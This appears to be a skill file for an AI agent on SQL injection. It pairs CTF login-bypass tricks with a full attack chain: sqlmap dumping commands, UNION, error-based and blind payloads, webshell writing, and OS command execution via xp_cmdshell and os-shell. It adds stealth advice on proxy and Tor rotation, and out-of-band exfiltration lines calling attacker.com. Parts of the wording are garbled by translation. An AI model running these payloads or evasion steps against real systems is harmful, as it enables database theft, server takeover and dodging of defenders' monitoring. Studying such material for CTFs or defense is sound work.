# web-sqli

# Skill: SQL Injection

> **Supplementary Files**:
> - `payloads.md` — Payload collection organized by 10 injection types (injection detection, UNION, Error, Blind, Double Query, WAF bypass, cross-database, file read/write)
> - `test-cases.md` — Structured test case templates (12 cases covering injection detection, UNION, Error-based, Blind, advanced exploitation - 5 categories)
> - `sqli-double-query-guide.md` — Double Query injection complete guide（extractvalue/updatexml/floor allcovering）
> - `sqli-cross-db-guide.md` — MySQL/PostgreSQL/MSSQL/Oracle cross-database injection guide

## Methodology / Methodology

### Login Auth Bypass + Keyword-Filter Reverse Engineering (CTF login form pattern)

When a login form rejects every credential guess (admin/empty/common passwords all
fail) and the challenge name hints at auth ("no pass", "who needs passwords"):

1. **Try SQLi auth bypass FIRST, before password guessing.** The username field is
   the injection point (password is usually hashed server-side before the query):
   `username=admin'--&password=x` (comments out the password check),
   `username=' OR '1'='1'--`, no-space variant `username=admin'/**/or/**/1=1--`.
   Then FOLLOW THE REDIRECT with the session cookie — success is a 302 to /home
   or similar, not the POST response body.

2. **If injection "doesn't work", suspect a keyword filter — the server may strip
   or replace substrings (e.g. `username.replace('admin','')`) BEFORE the query.**
   The filter is invisible in error messages, but the sanitized input is often
   ECHOED BACK (login page re-renders `value="<sanitized>"`, or a welcome
   message). Use the echo as a FREE ORACLE:
   - send probe `username=ADMINadmin'xx` → read the echoed sanitized value;
   - diff input vs echo → infer exactly which substring was removed/replaced
     and whether it is removed once or globally.

3. **Reverse the filter with a NESTED keyword** (the standard counter to a
   once-only `replace(k, '')`): split the keyword and re-insert itself —
   `k[:2] + k + k[2:]`. For `admin`: `ad` + `admin` + `min` = `adadminmin`
   → after `replace('admin','')` it becomes `admin` again. Compose with the
   SQLi suffix: `username=adadminmin'--` → query sees `admin'--`.

4. **Compose the full chain**: nested keyword + quote + comment, then follow the
   redirect with the cookie and read the authenticated page (the flag is usually
   printed there).

## Summary

Web Sqli skill domain covering web attack operations.

**Tools**: sqlmap, Burp Suite, curl, manual injection, browsetool DevTools

**Domain**: web-attack

**OWASP**: A03:2021-Injection

**MITRE ATT&CK**: T1190-Exploit Public-Facing App

## Description

SQL injection attacks and defense - covering all major SQLi types including error-based, union-based, blind (boolean/time), double query (error-based), stacked queries, and out-of-band injection. This skill covers the complete attack chain from detection to exploitation, along with corresponding defense strategies。

**Agent canpowerstatement**: Completed all 65 levels of SQLi-Labs, achieved expert-level proficiency in Double Query injection, with batch automated testing tools。

## Use Cases / Use Cases

1. **Web applicationpenetration testing** - Detect and exploit SQL injection vulnerabilities in target application, extract sensitive database information
2. **CTF competition challenges** - Quickly identify SQL injection challenge types (echo/blind/error/filter bypass), construct effective payloads
3. **security code audit** - Review application database interaction code from defense perspective, identify unsafe query construction
4. **WAF bypassresearch** - Construct encoding/transformation bypass payloads for scenarios filtering keywords, comment chars, spaces
5. **crossdatabaseinjection** - Specific injection techniques for MySQL, PostgreSQL, MSSQL, Oracle database engines

## Core Tools / Core Tools

| Tool | Purpose | Command Example |
|------|------|----------|
| **sqlmap** | Automated SQL injection detection and exploitation | `sqlmap -u "URL" --batch --dbs --threads=5` |
| **Burp Suite** | Intercept and modify HTTP requests, test POST/Header/Cookie injection | Repeater modulemanual debug payload |
| **curl** | quick GET injectiontesting | `curl "http://target/page?id=1' order by 3-- -"` |
| **manual injection** | understandprinciple basic technique | UNION / Error / Blind / Double Query |
| **browsetool DevTools** | Observe HTTP response differences, assist blind injection judgment | Network panelcapturepackageanalysis |

## Methodology / Methodology

### Attack Chain / Attack Chain

```
Detection → Fingerprinting → Exploitation → Data Extraction → Privilege Escalation
```

**1. Detection (Detectinjection point)**
- single quotetesting: `id=1'` / `id=1' -- -` / `id=1' and '1'='1`
- numberValuetypetesting: `id=1 and 1=1` / `id=1 and 1=2`
- judgeclosure method: `'` / `"` / `')` / `"))` / noclosure（entiretype）

**2. Fingerprinting (fingerprinting)**
- Determine column count: `' ORDER BY N-- -` (increment N until error)
- Identifydatabasetype: `@@version` (MySQL) / `version()` (PostgreSQL) / `@@servername` (MSSQL)
- confirminjection type: echo / error / blind injection / noecho

**3. Exploitation (categorized exploitation)**
- UNION injection: `' UNION SELECT 1,2,3-- -`（echoscenario）
- Error-based: `extractvalue()` / `updatexml()` / `floor()+rand()+group by`
- Boolean Blind: `' AND (SELECT LENGTH(database()))>5-- -`
- Time Blind: `' AND IF(1=1,SLEEP(3),0)-- -`
- Double Query: `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`
- Stacked Queries: `; INSERT INTO users VALUES(...)-- -`

**4. Data Extraction (data extraction)**
- Enumeratedatabase: `SELECT schema_name FROM information_schema.schemata`
- Enumeratetable: `SELECT table_name FROM information_schema.tables WHERE table_schema='TARGET_DB'`
- Enumeratecolumn: `SELECT column_name FROM information_schema.columns WHERE table_name='TARGET_TABLE'`
- Extractdata: `SELECT username,password FROM TARGET_TABLE`

**5. Privilege Escalation (privilege escalation)**
- file read/write: `LOAD_FILE('/etc/passwd')` / `INTO OUTFILE '/var/www/html/shell.php'`
- operating system commands: `sqlmap --os-shell`

## Practical Steps / Practical Steps

> **See payloads.md for detailed payloads, and test-cases.md for complete test checklist。** Below is a summary of core operations at each stage。

### Step 1: sqlmap automated Detect

```bash
# Basic detection (automatically identify injection type and technique)
sqlmap -u "http://target/page?id=1" --batch --threads=5

# Enumerate all databases
sqlmap -u "http://target/page?id=1" --batch --dbs

# Enumerate target database tables
sqlmap -u "http://target/page?id=1" --batch -D target_db --tables

# Enumerate columns and extract data
sqlmap -u "http://target/page?id=1" --batch -D target_db -T users --dump

# Specify injection technique (UNION only)
sqlmap -u "http://target/page?id=1" --technique=U --batch

# Specify injection technique (Double Query / Error-based)
sqlmap -u "http://target/page?id=1" --technique=E --batch

# Bypass WAF (tamper scripts)
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --batch
```

### Step 2: manual UNION injection（echoscenario）

```sql
-- 1. Determine column count
' ORDER BY 3-- -    -- 成功
' ORDER BY 4-- -    -- 失败，说明共 3 列

-- 2. Determine echo position
' UNION SELECT 1,2,3-- -

-- 3. Extractdatabaseinformation（assumptionNo. 2、3 columnhasecho）
' UNION SELECT 1,database(),version()-- -

-- 4. Enumerate table names
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -

-- 5. Enumerate column names
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -

-- 6. Extractdata
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

### Step 3: Double Query injection（errorscenario - expertlevel）

```sql
-- extractvalue() method（MySQL 5.1.5+，mostlength 32 characters）
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+
-- errorecho: XPATH syntax error: '~security~'

-- updatexml() method（MySQL 5.1.5+，mostlength 32 characters）
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--+

-- floor()+rand()+group by (classic method, no length limitation)
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

-- Extracttablename（Double Query）
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--+

-- Truncated reading for long data (exceeding 32 characters, use SUBSTRING)
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,31),0x7e))--+
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),32,31),0x7e))--+
```

### Step 4: Blind injection（noechoscenario）

```sql
-- Boolean Blind: Judge based on page content differences
' AND (SELECT LENGTH(database()))>5-- -      -- 页面正常 → 长度 > 5
' AND (SELECT LENGTH(database()))>10-- -     -- 页面异常 → 长度 <= 10
' AND SUBSTRING((SELECT database()),1,1)='s'-- -  -- 逐字符提取

-- Time Blind: Judge based on response time
' AND IF((SELECT LENGTH(database()))>5,SLEEP(3),0)-- -
' AND IF(SUBSTRING((SELECT database()),1,1)='s',SLEEP(3),0)-- -
```

### Step 5: Cross-database injection quick reference

```sql
-- PostgreSQL Error-based injection
' AND 1=CAST((SELECT version()) AS int)--

-- MSSQL Error-based injection
' AND 1=CONVERT(int,(SELECT @@version))--

-- Oracle Error-based injection
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
```

## Defense Evasion Techniques

### WAF Bypass
- **Keyword splitting**: `UN/**/ION SEL/**/ECT` (inline comments split keywords).
- **Case variation**: `UnIoN sElEcT`, `OrDeR By`.
- **Encoding**: URL-encoding (`%55nION`), hex (`0x55`), char() (`CHAR(85)`).
- **Whitespace alternatives**: Tab (`\t`), newline (`\n`), form feed (`\f`) instead of spaces.
- **Equivalent functions**: `MID()` for `SUBSTRING()`, `LIMIT` for `TOP`, `CONCAT_WS()` for `CONCAT()`.
- **No-quote strings**: `0xHex` (MySQL) or `CHR(65)||CHR(66)` (Oracle) to avoid quotes.

### Filter Evasion
- **Comment alternatives**: `--`, `#`, `/* */`, `;%00` (null byte), `/**/` (inline).
- **Quote alternatives**: `\"`, `\`, `\x27` (hex escape).
- **Operator alternatives**: `LIKE` for `=`, `BETWEEN` for `IN`, `NOT IN` for `<>`.
- **Boolean blind**: `AND 1=1` vs `AND 1=2` response differential.
- **Time-based blind**: `IF(condition, SLEEP(5), 0)`, `WAITFOR DELAY '0:0:5'` (MSSQL), `dbms_pipe.receive_message(('a'),5)` (Oracle).

### Database-Specific Tricks
- **MySQL**: `INTO OUTFILE` for webshell upload; `LOAD DATA INFILE` for file read; `global.general_log` for query logging pivot.
- **PostgreSQL**: `COPY (SELECT ...) TO '/tmp/x'` for file write; `lo_import`/`lo_export` for large object file ops.
- **MSSQL**: `xp_cmdshell` for OS command execution; `OPENROWSET` for OLEDB pivot; `sp_oacreate` for COM object abuse.
- **Oracle**: `DBMS_JAVA.RUNJAVA` for Java execution; `UTL_HTTP` for outbound requests; `DBMS_LDAP` for LDAP queries.

### Stealth Techniques
- **Slow extraction**: Sleep 2-3s between requests to avoid rate-based detection.
- **Distributed source**: Rotate through residential proxies / Tor circuits to avoid IP-based blocking.
- **Off-peak timing**: Run extraction during low-traffic hours to blend with maintenance queries.
- **Result caching**: Cache extracted bytes locally; minimize repeated queries for same data.
- **Differential response analysis**: Compare full response byte-by-byte rather than relying on error messages.

### Out-of-Band (OOB) Exfiltration
- **DNS exfil (MySQL)**: `SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.attacker.com\\\\x'))`.
- **DNS exfil (MSSQL)**: `EXEC master..xp_dirtree '\\\\'+CONVERT(varchar, @@version)+'.attacker.com\\x'`.
- **HTTP exfil (Oracle)**: `UTL_HTTP.REQUEST('http://'||user||'.attacker.com/')`.
- **DNS exfil (PostgreSQL)**: `COPY (SELECT ...) TO PROGRAM 'curl http://attacker.com/?data=$(base64 data)'`.
